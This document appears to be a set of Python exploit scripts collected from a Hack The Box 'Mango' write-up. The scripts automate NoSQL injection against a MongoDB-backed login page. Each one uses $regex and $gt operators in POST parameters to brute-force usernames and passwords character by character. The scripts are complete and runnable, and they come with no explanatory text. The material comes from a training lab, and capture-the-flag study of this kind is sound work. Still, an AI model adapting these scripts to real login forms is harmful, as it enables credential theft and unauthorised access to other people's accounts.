

####
#### https://0xdf.gitlab.io/2020/04/18/htb-mango.html
####

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break

####
####

def brute_user(res):
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {res}{c.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            brute_user(res + c)
    if not found:
        print(f"\r[+] Found user: {res.ljust(20)}")
        brute_password(res)

####
####

import requests
import string

url = "http://staging-order.mango.htb/index.php"
char_pool = list(string.ascii_letters) + list(string.digits) + ["\\" + c for c in "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"]
usernames = {}

def passLength(user):
    i = 1
    while True:
        post_data = {'username': user, 'password[$regex]': ".{" + str(i) + "}", 'login': 'login'}
        r = requests.post(url, data=post_data, allow_redirects=False)
        if r.status_code == 302:
            i += 1
        else:
            print(f"The length of the password for user {user} is {i-1}.")
            break


def get_usernames():
    post_data = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in char_pool:
        username = "^" + c
        post_data["username[$regex]"] = username + ".*"
        r = requests.post(url, data=post_data, allow_redirects=False)
        if r.status_code == 302:
            while True:
                for c2 in char_pool:
                    post_data["username[$regex]"] = username + c2 + ".*"
                    if  requests.post(url, data=post_data, allow_redirects=False).status_code == 302:
                        username += c2
                        break
                # Condition to exit
                if c2 == char_pool[-1]:
                    print("Found username: "+username[1:])
                    usernames[username[1:]] = ""
                    break
    return usernames


print("Special characters to check are == !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
for u in get_usernames():
    obj = "^"
    q = True
    while q:
        for c in char_pool:
            payload = obj + c
            post_data = {'username': u, 'password[$regex]': payload, 'login': 'login'}
            r = requests.post(url, data=post_data, allow_redirects=False)
            if r.status_code == 302:
                obj = payload
                print(".", end='', flush=True)
                break
            if c == char_pool[-1]:
                print("\nPassword for user: " + u + "  >>> " + obj[1:].replace("\\", ""))
                usernames[u] = obj[1:].replace("\\", "")
                q = False

print(str(usernames))

####
####

#!/usr/bin/env python
# Tested on Python 2.7
import requests
import string

url='http://staging-order.mango.htb/'
usernames=[]
passwords=[]
headers={'Content-Type': 'application/x-www-form-urlencoded'}
charset=string.printable

def getUsernames():
    usernames=[]
    r=''
    while True:
        username=''
        ulength=0
        for i in range(100):
            if len(usernames)==0:
                r=requests.post(url,data='username[$regex]=.{'+str(i)+'}&password[$regex]=.&login=login',headers=headers,allow_redirects=False)
            else:
                r=requests.post(url,data='username[$regex]=^(?!'+'|'.join(usernames)+').{'+str(i)+'}&password[$regex]=.&login=login',headers=headers,allow_redirects=False)
            if r.status_code==200:
                ulength=i-1
                break
        for i in range(ulength):
            for j in charset:
                if j in '^.[]{}$+*?|':
                    j='\\'+j
                if j=='&':
                    j='%26'
                if len(usernames)==0:
                    r=requests.post(url,data='username[$regex]=^'+username+j+'&password[$regex]=.&login=login',headers=headers,allow_redirects=False)
                else:
                    r=requests.post(url,data='username[$regex]=^(?!'+'|'.join(usernames)+')'+username+j+'&password[$regex]=.&login=login',headers=headers,allow_redirects=False)
                if r.status_code==302:
                    username+=j
                    break
        if len(username)==0:
            break
        usernames.append(username)
    return usernames

def getPasswords(usernames):
    passwords=[]
    r=''
    for u in usernames:
        password=''
        plength=0
        for i in range(100):
            r=requests.post(url,data='username[$eq]='+u+'&password[$regex]=.{'+str(i)+'}&login=login',headers=headers,allow_redirects=False)
            if r.status_code==200:
                plength=i-1
                break
        for i in range(plength):
            for j in charset:
                if j in '^.[]{}$+*?|':
                    j='\\'+j
                if j=='&':
                    j='%26'
                r=requests.post(url,data='username[$eq]='+u+'&password[$regex]=^'+password+j+'&login=login',headers=headers,allow_redirects=False)
                if r.status_code==302:
                    password+=j
                    break
        passwords.append(password)
    return passwords

usernames=getUsernames()
passwords=getPasswords(usernames)
print 'Username\tPassword'
for u,p in zip(usernames,passwords):
    print u+'\t'+p

####
####
